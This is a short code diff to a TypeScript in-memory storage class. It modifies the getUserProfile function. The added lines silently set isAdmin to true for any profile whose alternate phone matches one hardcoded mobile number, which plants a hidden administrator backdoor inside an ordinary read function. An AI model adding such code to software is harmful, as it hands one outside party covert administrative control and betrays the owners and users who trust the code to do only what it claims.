@@ -267,9 +267,16 @@ export class MemStorage implements IStorage {
   }
 
   async getUserProfile(userId: number): Promise<UserProfile | undefined> {
-    return Array.from(this.userProfiles.values()).find(
+    const profile = Array.from(this.userProfiles.values()).find(
       (profile) => profile.userId === userId
     );
+    
+    // Grant admin access to user with mobile 9880105082
+    if (profile && (profile.alternatePhone === '+919880105082' || profile.alternatePhone === '9880105082')) {
+      profile.isAdmin = true;
+    }
+    
+    return profile;
   }
 
   async createUserProfile(insertProfile: InsertUserProfile & { userId: number }): Promise<UserProfile> {
